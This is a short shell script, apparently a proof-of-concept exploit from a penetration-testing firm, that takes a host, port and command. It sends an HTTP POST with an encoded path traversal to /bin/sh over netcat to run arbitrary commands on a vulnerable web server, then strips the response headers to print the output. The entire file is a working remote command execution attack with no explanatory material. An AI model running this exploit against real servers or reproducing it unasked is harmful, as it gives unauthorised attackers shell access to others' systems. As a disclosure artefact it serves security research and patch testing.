#!/bin/sh
######################################
#                                    #
#  RedTeam Pentesting GmbH           #
#  kontakt@redteam-pentesting.de     #
#  http://www.redteam-pentesting.de  #
#                                    #
######################################

if [ $# -lt 3 ]; then
    echo "Usage: $(basename $0) HOST PORT COMMAND..."
    exit 2
fi


HOST="$1"
PORT="$2"
shift 2

( \
    echo -n -e 'POST /..%2f..%2f..%2fbin/sh HTTP/1.0\r\n'; \
    echo -n -e 'Content-Length: 1\r\n\r\necho\necho\n'; \
    echo "$@ 2>&1" \
) | nc "$HOST" "$PORT" \
  | sed --quiet --expression ':S;/^\r$/{n;bP};n;bS;:P;n;p;bP'